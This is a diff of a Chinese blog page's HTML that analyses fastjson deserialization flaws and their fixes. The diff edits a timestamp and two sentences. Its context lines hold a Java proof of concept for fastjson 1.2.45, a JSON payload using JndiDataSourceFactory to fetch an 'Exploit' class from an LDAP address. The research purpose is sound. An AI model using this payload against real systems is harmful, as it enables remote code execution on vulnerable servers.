@@ -33,7 +33,7 @@
 <meta property="og:image" content="https://s1.ax1x.com/2020/09/28/0Vy6aV.png">
 <meta property="og:image" content="https://s1.ax1x.com/2020/09/28/0V6kRg.png">
 <meta property="article:published_time" content="2020-09-28T16:21:12.000Z">
-<meta property="article:modified_time" content="2020-09-28T16:23:33.474Z">
+<meta property="article:modified_time" content="2020-09-28T16:27:46.297Z">
 <meta property="article:author" content="离怀秋">
 <meta property="article:tag" content="fastjson">
 <meta property="article:tag" content="java">
@@ -205,8 +205,7 @@
 <p>这里也解释下为什么{在逗号前后都可以，因为在json解析的过程的中遇到逗号直接会触发next函数，到下一个字符，所以前后都是无所谓的了。</p>
 <h5 id="Fix-2"><a href="#Fix-2" class="headerlink" title="Fix"></a>Fix</h5><p><a href="https://imgchr.com/i/0kmQ2t" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/27/0kmQ2t.png" alt=""></a></p>
 <p>对开头为[做了判断并进行异常抛出。</p>
-<h4 id="1-2-45"><a href="#1-2-45" class="headerlink" title="1.2.45"></a>1.2.45</h4><p>利用条件比之前局限性大了一些，之前是在1.2.25+会需要开启AutoTypeSupport才能指定type反序列化。</p>
-<p>现在版本多了一个需要 3.0.1&lt;mybatis&lt;3.4.6的jar包条件</p>
+<h4 id="1-2-45"><a href="#1-2-45" class="headerlink" title="1.2.45"></a>1.2.45</h4><p>利用条件比之前局限性大了一些，多了一个需要 3.0.1&lt;mybatis&lt;3.4.6的jar包条件</p>
 <h5 id="PoC-2"><a href="#PoC-2" class="headerlink" title="PoC"></a>PoC</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">String json = <span class="string">"&#123;\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":&#123;\"data_source\":\"ldap://localhost:1394/Exploit\"&#125;&#125;"</span>;</span><br><span class="line"></span><br><span class="line">JSON.parseObject(json);</span><br></pre></td></tr></table></figure>
 
 <p> 同样跟进分析一下</p>
@@ -235,7 +234,7 @@
 <p><img src="https://s1.ax1x.com/2020/09/28/0VBSln.png" alt=""></p>
 <p>跟进下StringVal函数看下具体实现</p>
 <p><img src="https://s1.ax1x.com/2020/09/28/0Vrvfe.png" alt="0Vrvfe.png"></p>
-<p>如果存在val键的话，通过parse函数进行解析并赋值给objVal变量,objVal变量再进一步赋值给</p>
+<p>如果存在val键的话，通过parse函数进行解析并赋值给objVal变量,objVal变量再进一步赋值给strVal</p>
 <p><img src="https://s1.ax1x.com/2020/09/28/0VsOun.png" alt="0VsOun.png"></p>
 <p>当clazz类型为Class.class时将strval作为classname进入loadClass函数，跟进看一下</p>
 <p><img src="https://s1.ax1x.com/2020/09/28/0Vy6aV.png" alt=""></p>
